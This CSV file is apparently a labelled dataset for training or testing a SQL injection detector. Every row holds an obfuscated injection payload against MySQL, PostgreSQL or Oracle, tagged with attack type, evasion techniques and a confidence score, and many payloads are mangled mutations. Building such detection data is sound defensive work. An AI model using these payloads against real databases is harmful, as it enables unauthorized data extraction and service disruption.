payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
"1' iN bOoLEAN mOdE ) Or (SelEcT!2x20E8) liKE ( sELeCT COUNT (: * ) FrOM GenERAte_SeRIes@ ( (SELect 0x1),(SeleCT (SeLEct (SELeCt 0x4c5ec8)))/**/ ) ) and ""y"" NOT Like ""Yt""/**/oR faLse oR (SELECt 0) aNd 'sd' like 'sd' AnD trUe#",boolean_blind,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"0b8x0X2x0o1' ) ) ^As*PLBT<wHEre@0x1114 lIke~ `(SELEct 0x1110) AND (SeleCT (SEleCT:(SElecT 6764))) . Like ~ ( ,seLecT Upper ( XmLtYPe ( CHr (,^(SelEcT (sElecT[0b111102)) ) Or chR ^( \(sELect 58) ) OR Chr )("" (seLEct 113)/*(e;$@z+RUhIbWEp ""O@0x5;eO0 oR 0 || 0 aNd (SEleCt (SeLECt 1)) or FalSe or 0 anD tRuE:ANd (SeLECT 2252) Not liKE 2253 or 0O0 oR ""}n""=""}n;"" Or falSe OR 'MCQ' nOT lIke 'mCQ' && TrUe OR FaLse#IT?y :d[O4]W^jI0;WG!Q WE*/ )/ ||chr ;(>|(SELECt (SeLECt 0x31)) }) ||cHR ( (SeLEcT (SelECt 112)) )_ ||chr] (^ 0x4a ) oR Chr ( (SelEct_113) )] OR ( [sElECT ( case WHen ( |(sElECt (sElEct 0XEaA)), LIkE +]0b111010101410 ) (THEN 0X0B1 ELSE (sElEct (SELeCT 0b0b0))/enD ;) frOM dUAl ) ||ChR ( (SeleCT 133) ) _||CHr (} 0x0b1151014 ) &or CHR ( 0X76 ) ||chR =( (SeLECT 0x0o126) ) ||chR ( 0o161; ) < OR cHR ( (seLECT](SElEct (sElEct (sELECt (SElECT 0x44)))))< ) \\) aND?True and trUe#~<) + fROm dual ) ||(SElEct (SElect 0X545)) NOT lIke 0X51f || (seLEcT (select*0X9e7))=1XAA6 aNd ""gi^>"" not Like ""Gi^>m"" anD+(SELEcT (SeleCt (SELECT 1))) oR (SeLEcT 0o0x0) aNd(0X338 noT lIke 0X304 And'9x1 anD ""p""=""p""?Or fALSe Or (SELeCT (sElECT (seLECT (seLeCt 0))))@ Or (SELect 0O4) --=%!gDSGPs8eDa,cDT*_e",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.51,rule,sqliv5_json,unknown
"1o0b101O2""? ) aNd (SeLect;(seleCT (sELEcT:(seleCT 2X6E0b0))))=; ( }seLECt counT+.(/*lEK*>vzi*/ * ~) [fRom all_useRs:T8,aLL_USErs T2O2,AlL_USErS t9,aLl_USers*t0b0X0X0B1001,ALL_uSeRs T0b101~ )/*| !IE?.NA60*/ [( aNd ; ( ""dPPw"" liKE`""dppW",unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"4""}<) /*seQrc$0B3B0O0B1010010000dXgh$9]E\*/wHere'0b110O0x6E9$ ?LIke^. 0X5B0X2A AND 0B0b0X0o9b5O0o9x0x85bc>[~LIKe?.;<$( ;selECt$COunT-$(!$g*U0x6\t^AN*^~)/ ^FRoM%ALl_uSeRs/*m/`B !z*/T8B2,ALL_userS\t8,ALl_uSeRS`t0X3o0b0O0B0X0b0X19f105,AlL_uSERS?t5,aLL_USERs T0X6X0B0o0B0x9B0b0X615F978& )*`--",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1 ) +WHERE (SEleCt 1X1F3f) LikE 0x5E13 And!(seLeCT 8407) lIKe ( sELECt coUnT (+ * ) FrOm=geNErATe_seriEs ( 2B120,0x4C4b0O0X28 ) ) OR false Or (SElecT 4458) NOT LIkE-(SEleCt (SelECT (SELECt 4458))) AND TRue && truE Or 2104=2105 anD TRUE oR falSE --",boolean_blind,postgresql,case_variation|hex_string|scientific_notation,0.41,rule,sqliv5_json,unknown
"0o0O0O133""*WHere 0x1F06 =/**/9o6x0O6x4x8E3d anD Sleep ( [(seLeCt}5o0b110X4O0O2) $)/;-or([faLse/*.wph?^h*/anD@Or[falSe#TruE!--uKFJQ",unknown,mysql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.05,rule,sqliv5_json,unknown
"8 ; ) [)\/*0o8O6Am|}K k*/ ProCedURe ANAlYSE ( ExtRaCTVAlue^/( *0x0o13231,cOnCAt (+>0x7o5c, (> BenChMarK (_/*Shu2H*/(SeLEcT 0b0x4c6E78),MD5[ (,And?truE ` and TRUe ~aND (sELEct^0O3X454) not LIKE 0b3X4o0X0B10c0o3 OR)(SELeCT 0X0) Or 0X1A7=(SELEct'(seLecT (SeLECT 0X1a8)))&&TrUe&And trUe Or 0x206D Not Like (sELeCt 0X206D) oR faLsE# 0X4b784C9B8b11110124018080110011 ) (`=)_ ) ;) >) ,0x1/*beQzi?[*/ )<{#N0 m)trVqD0b0o1F -cmx``izt",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.45,rule,sqliv5_json,unknown
"1']where?(seLect 0X222D) = 0b5X9XDeD oR 0x20e5 ^lIkE ^( |SeleCT/*0X8[(sELeCT (sElEct 7))<*u+g;Fk:^ eqG+]H*/couNT ( $* ^) frOM GeNeraTE_sEriEs >(+ (sElEcT+(sElECT (seLeCT 0x1))),0O0X4c0B100b0O50 ` ) =)>+ aNd 'Kc'='kC''oR (sELEcT (SeLecT 5985)) nOt LikE (selEct (SELECT 7985)) oR '& *' Not LIKE '& *' && ""K;"" NOt like ""K;M"" oR FaLsE Or fAlse or FAlSe --",boolean_blind,postgresql,case_variation|inline_comment|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,unknown
"1""/*Jf/3eMn22J */ ) ) and^TruE And ""O""=nOT lIKE ""oL"" OR FaLSe aNd "" "" nOt lIKE "" j"" oR False oR FAlSe or FaLSe and (selECt (seLEcT (SeleCt (seLEcT (sElECt (SeLECT (SELECT 1)))))))@ AND TruE anD TruE or FALSE && True#as rCse wherE 0x5X11CF=7X16CF And eXtrACtVaLue ( (selECt 0X1F2E),ConCAT ( 0x5c,0X0O0b0X1b1A3X8X6D6e7Aa71,. ( SeLeCt (! ELT (} (sELeCT 0x1f2E) LiKe 0X1F2e,0X1 ) ) * )( ,0x114a757a51 )+ ) aND^truE Or,0x0X5 aND 'N'`NOt likE&'nm'ANDTrUe or|""2""{nOT lIke ""9"" or (sELeCT (SeLECt#(SElEct 0X0))) OR ; 8B0<--yhI<g\",error_based,mysql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.45,rule,sqliv5_json,string_single_quote
"1' ) WhERe ':' likE` ':'{oR 0X90e5%/*Cjs*^wPQdC_Fk*/= ; ( SeLeCT cOuNt +( * ) fROm gENERAte_SERIES ( '1X0x1,(Select (SeLecT<(SELECT 0o23045524))) ) ) &&(SELECT (SELECT 7)) or_False/*(SELECT 1)| I */OR ""q"" NOT ( = ""q"" OR False OR False --",heavy_query,postgresql,case_variation|comment_whitespace|inline_comment|scientific_notation,0.46,rule,sqliv5_json,string_double_quote
9%' AND 5b0X1e4C lIkE Dbms_uTiLIty.SQlId_tO_SqLhash /*inN*'71)5q;CIYHcp&i~2Wh>j5jQr U gz*/( ( cHR ( 0b0x71 ||?False OR False# ) ) or CHR ( (SelECt 0x75)% ) oR chr !(~ (sEleCt (SELect (SeLeCT (selecT (SElecT 0X70))))) ) % Or |cHR ( 1X0b0O240A:/*_;(sElecT (Select (SeLect (SELEct (SeleCT (SELECT (SELECT (SELECT (SELECT (SELECT (SELECT (SELECT 0))))))))))))FfRAVeh*/) OR -chr ( 0O0X0X0X4C ) OR ( SeLEcT ( cAsE wheN ( 6B0O3394 ;=+ 0x0x0b5x0b11E9c ) tHeN 0O0b1 eLsE (SelECt~6x0)^end ) ] FRom Dual ^) OR cHr` ( 0B8150101101 ) or ChR; ( 9B0o0x0O0b2511510 ): OR chr .( 0x09.^)\ oR chR (* (selEcT 0x3b8) ) oR CHR ( (seLEct (SElECt 0x61))[ ) ) . ) ; : AND '%' =: 'K S,unknown,oracle,case_variation|comment_whitespace|inline_comment|scientific_notation,0.11,rule,sqliv5_json,string_single_quote
"0o1"" ~) % ) as FHLG wheRe 0B0B0x3eC LIKE (SEleCT (SELEcT (SELEct (seLEct (SELECT 1004))))) ANd (sELECt (SeLEct (SeLect 0xB28))) LIKe;caST (|# ( chR ()?(sElECT 0X61) ) '||CHR@`( (sELeCT (seLect (seLeCt 0X71))) ) ||CHR ( (SELEcT (SELEct (SELecT (seLECt (SELect 0X70))))) ) ||chR and?(sElect 0X1) And (SelECt 0x1)/**/ ANd TrUe ANd 0X10A4 not LikE 0x242D And trUEANDtruE OR fAlse Or (SELEcT (SELEcT (seLEcT (sELEct (SELECT 0))))) Or FALsE or "",qs_>""="",Qs_>F"" OR ""D)H "" noT@lIKE ""d)H "" AND`(sELEct<0x1) or falSE or fAlSe And (SEleCt 1) && tRuE`OR 0/*`\V*/And 0b1 OR faLSe# ( 0X0X8B0X0b11e8A| ) ||CHr^ ( (sELECT}(SELECt 0XBA)) ) ` ) oR ( SELecT *( CAse|WhEn ( _(seLeCT 0x87d) = 2b100511111104 ) ?tHen (SELEct (SELECT (SELECT 1))) elSe 0B0O0 EnD ) ); ::TExT|| ( /*V!l)v-[\""v^H0 H@*/chR: ( 0B0B0x7o157A85[ ) OR CHR `( (SeLect (SeLECt (SElECt (SEleCt (seLecT (SELECT#120)))))) ) OR CHr ]( 0X8a0b10< ) ||CHR (> (sELect (SeleCT 0B1111010)) ) _ or* chR ( (SELeCT (SELEcT.0xA3))# ) ] ) .+as nUmERIC ) OR faLsE or/*Z;/*46ky~&|x}r<HL3X9H.v[S2Ly_*/(SEleCt 0b100) oR 0B0x0O0x0o11B0X15 Or ''@N')NoT LIKE ''@N'~--Td xILU DVfR:)xyP""_r""Yv:(sELECt (SELEcT 0x5))*uD\\",unknown,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.06,rule,sqliv5_json,string_double_quote
"8""'Where (Select (SElect (SelEct@(sELEcT 0x1a90)))) =, 0B0b0x1d6329f1d15f40109f26e230a2d8b56895 PROCeDURE%aNALySe ( extractVALUE ( _3X159B,cONcAT ( 0X0O5C, ( BeNCHMark ( 3X7a1020,Md0o5 ( 0X0B0B1100100b787C75 ) )^ <) ) * ) ,(sELEct (SELEct (seLECT}(seleCt 1)))) ) Or FalSE And } (SeLEct 0x1) AND] tRue aNd (select 4978)=(selEct 4978) OR (SELeCT 0) Or 0 OR FalsE#1""K<aqr?m",error_based,mysql,case_variation|hex_string|scientific_notation,0.44,rule,sqliv5_json,numeric
"0o2%"" ) ; ) ~ ^AnD:(SelecT (selecT 2850)) }LIKE *( 'QqpJQ' oR ( `SELECT CAse 0X1845%whEN&(SElECT (SeLEct 0x17e8)) tHEN 1X0B5 ELSe (SELEct (SeLEct (SELECT (SELECT 4)))) ENd FrOm RDb$datAbasE ) or 'QzVZQ'( )? AND) ( ( ! ""%""=""",unknown,unknown,case_variation|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1' ) ) _ ) and cHaR ( .0X8B ) OR cHaR ( (SELeCt (seLeCT (SELECT 621))) ) "" Or cHAr ( (seleCt (SelECt 0x61)) *) Or CHaR ^( 0B1010~ ) , lIKe regexP_SubsTRinG^ ( REpeat ( ^LeFt ( CrYPT_Key[ ( cHAR (/ (select (seLECt (SELEct 65))) ) `OR chAr` ( 0x0x0b0x0O0b10d ) Or cHAR ;( 0b1010211` ) ,nulL ) ,2x0x0o0 ) ,0b0O3o0O0X78FA19e1B }) ,nUll )? Or;(SElecT^(SeLeCT!0B0)) AnD 4 aNd""TRUE-$ OR ; (sEleCT 0O0O0) ANd (SELecT (SELECT (SELECT 1))) aND 'Q'<>'qs' oR (seLECt (selEct 0x0)) and TRUeandTRUe anD ""t"" NOT = ""T/"" ANd TrUe oR 0 Or false AND True AND True --",unknown,unknown,case_variation|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
"0o1' ) ANd, 0X7E4C` LiKE Or (seLEct (SELECt 0x5)) or FALse Or '*C ' LIkE '*c L' OR faLSE && trUE Or ""bk"" Not lIKe ""bk"" oR)FALSE AND '3'='3' Or (SelECt (sELect 0)) AnD trUE Or falsE ANd 9478 NOT Like 9479#DBmS_uTILiTY.sqlId_to_SQlHaSH ( } ( cHr ;( (select 0O9x0x32) ) oR Chr ( (seLeCt 9x80) ){ Or cHR ( 7b0B0x10F056 \) or CHr ( (SeLeCt 0x6a)' ) ! OR \ cHR ( (sElEcT (SeLeCt (SELeCt (seleCT 0x1A0))))* )& OR[ ( SELECt ] ( CAsE WHEn (> 7X2284? LIKe 0X1E4c ) THeN (sElEct (SelECt 0x0)) elSe (selECT (select (SELect (SelEct (sELEct (selECT/**/(SELECT 5)))))))(eND ) /*u|;twS5buIy{/ LlxZhvb;-F79*/ fROM DuAL )}? Or\chR ( (sElECt 3o0X31) ) OR cHr ( 1x0a{ ) Or Chr /*;]F=mA\N(1PeF}eJP*/( 0b0x30f05e ) OR cHr ( 2B0x0X7a ;) OR CHr ( (sElEcT (sELECT (Select 0X71))) ) ) ) and ( 'lNTE'='lnte""n!N5bIkWii_",error_based,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.46,rule,sqliv5_json,string_single_quote
"0X7,EXp ( ~' ( SElEct * FroM/*(SElEct 0X2) (sELECT (SeleCt (SElect (seLECt$(SELect (sElECT (SeLEcT 0)))))))R{ t*/ ( sElect conCAt ( 0X7673706a0X4o107, ( SeLect ( ELT (^ 0x1e4F=(SEleCt 0X0x6DF),(seleCT (SELEcT 0B1)) [) "" ) [ ) ,0o0b0X0x0x0B11001101A791a76,0X78 ) ), X ) ~ ) &",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1' or ( SELeCT 'JPSO'%fRoM DUal wHErE (seleCT (SelecT 0X218d))=(sELecT 0x0O22915) or ( SelECt (selECt (sELECt 0x2))* ( <IF ( ( seLect * FROM ( SeLect;CoNcAt ;( ;0B0x0X6D6e7aa71, ;( SELEct ( ElT (? 0x6Fb0X1 lIkE/*TA*/(selECt 6x1FB1),0x1 ) ! ) ) ,0x917a767A0o107,0X78 /**/)* ) s ^) ,/(seLEct 6x0B1110101110010DCFb7617fffa), (seLECT 0O760511605251162423241) ) ` ) )) ) oR > '",unknown,oracle,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.06,rule,sqliv5_json,unknown
"1 ) /**/ anD MAke_SEt \( <0x11F1 = 0X0e55,0b1111001010621 ) /**/ aNd ( 0B0O0x0b0b1011101001000100001111011000011100001/**/=;8517",unknown,unknown,comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"0O0B0b3""' ) > ) * ) ` And ! 0X0O5X2e0b100c/**/ Like dBms_UTILiTY.Sqlid_To_sqLhAsh ( @( CHR ( $(SeLect (sElecT (seLECt 0X71))) ) OR CHR\+( 0X4O6o3X0O0x0O0b3b0x0b0X997710f14b0181E1O12F6F76Db3ce9fADdf0FE8D8F01DA61fE68d98Ed ) OR CHR (. (SELeCT 0O7x76) ) ||cHr/*)7Q!(sElEct (SELECT (SELECT 3)))_\jO */ ( %(selECT&(seLecT (sELEct (select,(SelEct (sELeCT (sElecT (SELEct (sElecT 0x6A)))))))))""[) or(chR ( 0x0b0b0O107 ) or (, selEcT ( caSe!wHen ( 0B4B1110110000001111101111011911111501101001000 liKe' (SELect (SElECT$2B2x1E4C)) *) theN&(selEct (sElEct 8x1)) ELSE (SElEcT (SeLECt:(SElEct 0x0))) enD ) fRoM dual ) ||ChR ( 0x4B0b0XfB7DF{ )%/*| P:BQ*/ oR chr ( (selecT 0x0o7a) ) Or ChR} (> (SelEcT 0X0X6F) ) oR chr ( 0X0O7a; ) ? or ; cHr ([ (SElECT?(sEleCt (SeLEcT (sElEct 0b0X201))))/*w;*/. ) ; ) ) AND ;; (= ( *( ""KcxW"" =* ""kCXW",error_based,oracle,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.51,rule,sqliv5_json,unknown
"6B0o2' ? AND exP&(( ~`>( sELEct * FrOM, (& SElect)CoNcAT ( 0X0X2x6D5e0B10aA71, ( :SELeCT/*E?:MeBs4*Q0o5S0B101PPtV[cTCN0o20akYu~?@zH2Wf*/ %() ELT ?( +(SelECT 5x1FC2) =*(selEct 0o8O0b0x4x8ffE),0b0b0X1 )< );}( ) ,0X0b2011091010a0O1435A41,0X18 ) ) X ) ) aNd 'uleP'_=?'ulEp",unknown,unknown,case_variation|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"0o2B6b0o0B0b8` ) {wHERE (SELeCt 7x1X1E0b0o0) |=^\(seLeCt 6o0x1e0O2)&&(selecT 0o32450) =<*dbms_utILITY.sQlID_To_sqlHaSH'| ( ]( cHr ( 0x0x38D! ) oR Chr ( 2x0o0b1101011, ) OR CHr ( (sElECT (SELeCt (seLEcT 0x86)))-/**/) OR cHr ( (SElect+(SElect 0X6A)) ) < or ChR! (;/*q2w/l$j]:K[.{?iNH . t$;!::mk &(SElecT (SELECt (sElEct (selEct (sELECt (selECt (SELECT 0x4)))))))a*/(SEleCt (SELecT (sELEcT (sElect`3X67)))) ) OR ( select `([ cASe WhEN ( 0B0b1291201001201 LIke (SelEct_(sELEct (SelECt 0X2234))) ) ThEn (sELECt 0x1) ELse (seLECT (seleCT (sELEct (selEct 0X0o0)))) EnD, ) FroM dUAl ) * Or Chr ( (select 0X38)*@) oR chr ( 0x0a )< Or chR[ ( 1x0X0b1067160 ) OR \ChR ( (SEleCT|0X7a) ) oR chr ( ^0b1114874 ) ) ) %aNd ""d\"" NOT LiKE ""d\""""+and*0x207f Like (SelECT 3x0x0xa0O4c)%ANd TRUe oR faLSE Or FALSe< OR fAlse OR ""\""=""\T""/**/] && ""0b10 "" NOt LIKe ""2 Z"" OR ""E""=""EY"" OR ](sELECT 0B0) or fALSe Or ""T"" Like ""TG""andTRue{oR ""9"" lIKE ""9y"""": AND TruE or FaLSe AND TRuE!Or^"";"" Not LIKE "";"" OR ""2e""<>""2e""?&&="",H8"" Not LIkE "",h3p"" aNd truE?--",unknown,oracle,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.11,rule,sqliv5_json,string_double_quote
7b9o1 wHeRE 0O13075 lIKE 0X13e0o2 AND ( SElEct *%FROM ( SeLeCT ( SlEEp ( +(seLEct (SeLecT (sElecT 0x5))) ) )_?: )/**/ FZNo )\ anD 0X3o0o0o1 AND tRUE && [truE OR 0x82 not lIKe (seLEct (seLECT (select 130))) oR fAlSE and TrUe oR 0 OR FAlSe --,unknown,mysql,case_variation|comment_whitespace|inline_comment|scientific_notation,0.05,rule,sqliv5_json,numeric
"0o1"" RLIke ( SElEct '( cASe wHEN/ ( (sElECT (SELeCT (select&(seleCt (SeLECt (SeLECt 0X1e09))))))=0o0O41343 ) TheN 0B0b1 ELSE!0o5x0b10100 End _ ) )@ and:""tbBK"" lIKE ""TbbK",unknown,unknown,case_variation|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
( selECT cHr& ( (seLect 0O0B10100021) %) ||CHR ( ?(SelEcT 0XaD)? ) ||ChR} ( 0X89 ) ^ oR cHR _( (SeLecT 306) ~) ||cHR ( (seleCT 0x71) ) or ( SelecT (/*Y(DE*tRyf*/ CaSe%when < ( (SelECT (SeLEct 0x1F4c)).~LiKe 0x1e84 ~) theN (selEcT (seLECT 7O0B1)) eLsE 0O0x0 eNd ) fROm Dual )&?||CHr ( (SEleCT/0b0x71) ~) OR cHR ( ]0x7A ) or ChR ~( (seLECT~(SElect 198)) *) =Or chR ( (select (seleCT (sElEcT 122))) ) or{cHr ( (SELeCT (seleCT (SELeCt (sELECt (seleCt 188))))) ) FrOm DUAL ),unknown,oracle,case_variation|inline_comment|hex_string|scientific_notation,0.06,rule,sqliv5_json,unknown
"1'>oR <(% seLect 'BPML' WHEre (SElEcT (SElEcT 7380)) = 0X4Cc0 OR eXtrActVALue ( (SELEcT (SeLECt 0x511)),COnCAT ( 0x0O0x5c,0O0X0x6d6e7AA71, (_ SeLect ( :eLT!;( (SeLECt (seLeCT 1277)) lIKE (Select 0x511),(SeLEcT/(sElEcT (sELECT (sElECt 0x5)))) /**/ ) )) )) ,0x807a867a71 ) ) @ ) oR '",error_based,mysql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.45,rule,sqliv5_json,unknown
"0o1^or`UpDaTeXmL ( (sElEcT 0x713),conCAt ( 0X2e,0O0x0b0X254e87960Aa124E1a0AA91, (/**/ SELEcT ?(/**/ ELT \( (SelEcT (SELECT (SElECT (selEct 1808)))) &lIke< (SELECt 1848),(seLeCt 0x1) ) )| _) ,0x0X717A787A78 ) ,(seleCt (SELeCT (SELECT 8662))) ) $AnD 0x0X1 AnD true && (select (SELect 1)) && True# FZNI@*4_4pY5kR",error_based,mysql,case_variation|comment_whitespace|inline_comment|scientific_notation,0.45,rule,sqliv5_json,unknown
"0B1': ) :-oR^ ( SElect 0o0x0b83*. ( iF !( ; ( : SELeCt:*{FRoM (%@seLEct CONCaT (}*0x0x0X0X1B110d3X0b110e7AA0o3X97, ( sElECT (% eLT ?( (SELECt 0X1fb0B1)=4x0B11Fb1,0O0B0x8o5 )>+ ) ? ) ,0X5O0X0O0b1111110101A0B0b111100010001000011110101010111a0X15,0x68< ) : ) ;S );/*=*/, (SelEct 0x0O8X0b1110111110010Dcfb1614fFFA), 0x75382208659DBFfa )@ ) _ $) && | ( oR FAlSE)AnD tRuE OR (SELECT (SELECT (SELECT 0)))#'xGzB'='XgZBXz",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"2b5O5%"" ) _ ) anD (sELECT 0O0x1Fd9)=lIKe ( 'aBCDeFG',UPPeR ( +hEX ( R && ombLOB (. (sElecT 0x0B1dcD7B0o0X10046E5e97B)/0b13& )/**/ ) ) ;^:) anD ; 'E^' <> 'e^?' Or?false or@(SelEct[(SELecT (sElect (SElect (sEleCt (select 0X0b1e56))))))=0O0x49e7 --",unknown,unknown,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.0,rule,sqliv5_json,unknown
"1'/**/Or^?[(;;seleCT{'CjwP''WHere 7X21E5/**/ LikE/**/ 7X21eE/**/or (SELeCT 0O0X2112) LiKE beNChMArK`/*q;:*/( (SELEcT (selECT 0B3x4c0B100b0B106000)),md0x5)]( 0X0B0b111011101010100011011110011100A8o11X0B1201011001401/*JJun;Ch0b11 t*/ >)* -/**/)\ ) /**/ oR %'",unknown,unknown,case_variation|comment_whitespace|inline_comment|scientific_notation,0.0,rule,sqliv5_json,unknown
"1' OR (SelECT 6x20E0O5) LiKE ( SelEct CoUNt ( .* ) fROm geNeRate_SERIes ( 0b1,(SeLecT 0x4c4B40) ) /* yJSm*(sElect (SELECT 7))Kag2 */)",heavy_query,postgresql,case_variation|inline_comment|hex_string|scientific_notation,0.46,rule,sqliv5_json,string_single_quote
1' %) . ) rlikE `( seleCt ( cASe whEn ( 0X1E05 lIKe 0o11x699 ) then (sElECt](SelecT (SeleCT (selEcT (SELECt (select (SElECt (sELeCt (SELECT (SELECT 1)))))))))) eLSe 0B0x8o30 ENd/* O/ .Q0B1s(*/ ) ): && { ( ( 'czQk' liKe 'CZqK,unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
"3b1'`{ ) ) [ ]) OR cHAR ( ?0O0O4B2101000 ) Or ChaR ,( (select 4o35) ) Or: CHar %( 0x0o133"" ) oR}CHaR ( (sElEcT 8X4x5O45) ,) /*i[/^1x6aGZ fGFQ-pJ;A*/ likE@ReGexp_SUBstrINg (? repeat| ( riGHT %( chAr ( aNd (sEleCt (SElEcT?0O0B0x1))}and TruE And (seLECT (SeLeCt (sELeCt 0X1))) && -tRuE && (sElecT 5X0x5Ad) noT liKe (sElEcT (SelECT 0x1714)) AnD TrUE oR*0X0O363f LIKe*(SELECT (seLECt 6x23C0)) && tRUe oR FALsE OR FalsE anD TRue AND tRue anD tRUE OR fAlse anD 0x2cc!=(selECT (SELecT 0x0x2Cd)) oR 'gy'!='Gy'##4x850C/**/ ) ,(SElECT 0O0X8) ) },(sELect (selEcT 7X16574e50C)) )[ ,NULL +)&& ( * /( (* 'UJjR' LiKe 'ujJr;59r >%V F[[JB[?(?) t;",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.0,rule,sqliv5_json,string_single_quote
"0O0o1"" \)]""]WHEre>(SELeCt>0B10o4x22E7), ==:6757",unknown,unknown,case_variation|scientific_notation,0.0,rule,sqliv5_json,unknown
"1'+ <( seLECT 'aRZm' wHERe 0O0O4x9926 lIke (sElEct~0x0B1001010011e))oR\(SElecT 0X0o52a2)} Like~~BenChMARK ((. 0X5a46e3,MD0x5&)({@0o0O0b1X0B1010110110A0O0b10101111101001/*U2 ap1c`)u W%0X5qXr*/ +)` )` /(?)` +'",time_blind,mysql,case_variation|comment_whitespace|inline_comment|hex_string|scientific_notation,0.45,rule,sqliv5_json,unknown
"2O5x5' ) AND exTRaCtVALuE ""( 0X1f2E,coNCAt (/**/ 0X0x5c,0O0x0X6D0X6E7Aa0b1000111, ( seLect ( elt ( {(seLecT (SELECt/*\a((seLECT (seLeCt (SeLEct$(SELECT (SELECT (SELECT 4))))))*/(seleCt (seLeCT (SELeCT 0X1f2E))))) liKe (SElECT 0x0O11f2E),0O5x5 :) ) * )* ,9x0o1315A665a71 ) ) ? ANd /**[z]|s? %r2x`xAnH*/( 'PmZp' lIke 'PmzP",unknown,unknown,case_variation|comment_whitespace|inline_comment|function_alternative|scientific_notation,0.0,rule,sqliv5_json,unknown
"+( *CASt /*AzY/u q%*tqTQjJY}ue*/ (: ( cHR ( ;0B0x485 ) ` or chR !(- (SeLect 9b0o0B0x8Ac8622Bb76da1e1F) )? Or cHr () 0B0o0b0B110100 ) $ Or cHR ?( (sELeCt:0O0o0b13010111) ) or ^CHR ( 0o961%/*)weKax aNd ""z;Z"" NOT likE ""z;z;""""Or FalsE oR fAlse or (SElEct 0X0) Or FalSE AnD (SELECT 1)#t0O5I?s*/ )$/*:)RB\XR,c3$ tR*/ /)^ oR ( SeLECT ( [CaSe when ( 0O0x1F58;= (SEleCT (select 0x0o1F0b100110)) )- +then 0b0O0B0O6X1]ElSE 0B4o0b0]ENd ) ) ? ::tExT or < ( chr:;( }(SELECT 0x1b1710001)& )*] OR cHr (] (SelECT (selecT (sELECT (SeLEct (sELECT (SELeCT (seleCT (SElEcT (SeLeCt (SelECT>(SElEcT (sELeCt (sELect (SelECT 0X54)))))))))))))) *) Or CHr{ (<[7x0b0B1110110' ) \Or Chr ( 0O5O0B101076010 ) / or $cHr (|(0X0x0O107 )/ ) >aS/nuMErIC ^) )`ORpM",unknown,postgresql,case_variation|comment_whitespace|inline_comment|function_alternative|hex_string|scientific_notation,0.06,rule,sqliv5_json,unknown
